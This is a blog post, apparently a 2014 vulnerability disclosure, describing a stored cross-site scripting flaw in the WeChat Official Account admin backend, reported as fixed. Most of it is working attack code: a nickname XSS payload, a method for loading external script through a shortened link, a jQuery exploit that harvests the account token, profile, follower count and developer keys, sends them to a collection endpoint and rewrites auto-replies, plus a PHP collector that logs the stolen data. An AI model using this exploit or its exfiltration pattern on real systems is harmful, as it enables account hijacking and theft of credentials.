---
layout: post
title: 微信公众号后台跨站漏洞 EXP (已修复)
---

{{ page.title }}
================
<p class="date">{{ page.date | date_to_string }} - evi1m0</p>


#### Vul Description

 - 提交时间：2014-08-19 15:04:14
 - 修复时间：2014-08-19 20:00:11
 
问题存在于微信公众号后台查看消息时用户名处的触发。


#### Bypass nickname length limit

微信对用户名进行了长度限制，使用安卓版微信可以绕过长度限制，这里测试使用的红米手机微信5.2：

![wechat_version](/images/FB10EC57-738D-4FB1-9A3D-E85E2E1EFBD8.png)


#### Detailed

绕过名字长度后，将微信用户名修改为：```test/*<img/src=@/onerror=alert(1)>```
回复公众号，后台查看触发：![wechat_xss_demo1](/images/FEEF04DC-70B4-4B61-935D-482D1C34ABB2.png)

之后我们考虑如何嵌入外部JS以方便的调试接下来要编写的Exploit，微信公众号后台使用https，需要引用外部的https js资源才行，之后我找到了：[https://bitly.com/shorten/](https://bitly.com/shorten/)

使用bitly将放置在github的https js资源连接进行网址缩短，例如：

	https://gist.githubusercontent.com/Evi1m0/497330da6935a30/raw/0c8ab3d6fec57c8052262e85c315549f1d0e869a/1.js
	
连接缩短：bit.ly/1dPaWIx ，生成后默认为http修改为https即可。

最后嵌入JS的长度为：

![wechat_xss_demo2](/images/258F0D1C-F712-4459-8040-B5CF7B641278.png)

#### Exploit

 - 获取公众号注册信息、登录邮箱等个人信息
 - 获取公众号粉丝数量
 - 普通模式则篡改自动回复的内容
 - 开发模式则偷取Key值和连接地址
 - 获取Token
 - More

```Wechat-exp.js```: 微信公众号后台使用jQuery，使用jQuery编写此exp。

{% highlight javascript %}
/* * mp.weixin.qq.com exp.js * author: Evi1m0 & Chichou * date: 20140313 */(function() {    // 在IE7以下支持JSON格式化    if (typeof JSON.stringify !== 'function') {        JSON.stringify = function(object) {            var array = [];            for (var i in object) {                var s = object[i], v = (typeof s == 'object' && s != null) ? JSON.stringify(s) :                    (/^(string|number)$/.test(typeof s) ? "'" + s + "'" : s);                array.push("'" + i + "':" + v);            }            return '{' + array.join(',') + '}';        }    }    // send data    var send = function(item, data) {        if(typeof data == 'object')            data = JSON.stringify(data);        new Image().src = ["http://localhost/wxprobe.php?subject=wechat&uin=", wx.data.uin, "&item=", item, "&data=", data].join('');    }    // 公号信息    var user = {        token: wx.data.t,        uin: wx.data.uin,        name: wx.data.user_name    };    send('id', user);    // 粉丝人数    $.get('/cgi-bin/home?t=home/index&lang=zh_CN&token=' + user.token, function(data) {      var dom = $(data);      var fans={};      var fans = $('.number')[2].innerHTML;      send('fans', fans);    });    // 详细资料    $.get('/cgi-bin/settingpage?t=setting/index&action=index&token=' + user.token, function(data) {        var dom = $(data);        var profile = {};        dom.find('li.account_setting_item .tips,li.account_setting_item .desc').remove();        dom.find('li.account_setting_item').each(function(i, e) {            profile[$.trim($(e).find("h4").text())] = $.trim($(e).find('.meta_content').text());        });        send('profile', profile);    });    // 开发模式    $.get('/cgi-bin/advanced?action=dev&t=advanced/dev&token=' + user.token, function(data) {        var dom = $(data); data = dom.find("#js_container_box .frm_input_box");        var dev = {}        $.each(['url', 'token'], function(i, e) {            dev[e] = $.trim(e.innerHTML);        });        send('dev', dev);    });    //普通模式    $.get('/cgi-bin/autoreply?t=ivr/reply&action=beadded&token=' + user.token, function(data) {        var form = {            token: wx.data.t,            lang: wx.data.lang,            random: Math.random(),            f: 'json',            ajax: 1,            cgi: 'setreplyrule',            fun: 'save',            t: 'ajax-response',            content: 'Attack Content'        };        var keyword = {'replytype': 'replytype : "', 'ruleid': 'rule_id : "'};        for(var i in keyword) {            if(data.indexOf(keyword[i]) === -1) {                form[i] = '';            } else {                var left = data.indexOf(keyword[i]) + keyword[i].length, right = data.indexOf('"', left);                form[i] = data.substring(left, right);            }        }        //篡改        $.post('/cgi-bin/setreplyrule', form);    });})();
{% endhighlight %}


```wxprobe.php```: 服务端接受获取内容

    <?php

    /*
     * Wechat probe
     * author: <evi1m0#ff0000.cc>
     * 20140313
     */

    @header("Content-Type:text/html;charset=utf8");
    if (!(isset($_GET['subject']) && $_GET['subject'] === 'wechat')) die;

    //获取信息
    $uin = urldecode($_GET['uin']);
    $item = urldecode($_GET['item']);
    $data = urldecode($_GET['data']);

    //判断创建
    if(!file_exists('./wxdata.html')){
        $fp = fopen('./wxdata.html', 'a+');
        fwrite($fp,'<head><meta http-equiv="Content-Type" Content="text/html; charset=utf8" /> <title>wxdata</title></head>');
    }
    $fp = fopen('./wxdata.html', 'a+');
    fwrite($fp, htmlspecialchars($uin). "| <br>item: ". htmlspecialchars($item). "<br>Data: ". htmlspecialchars($data). "<hr><br>");
    fclose($fp);

    ?>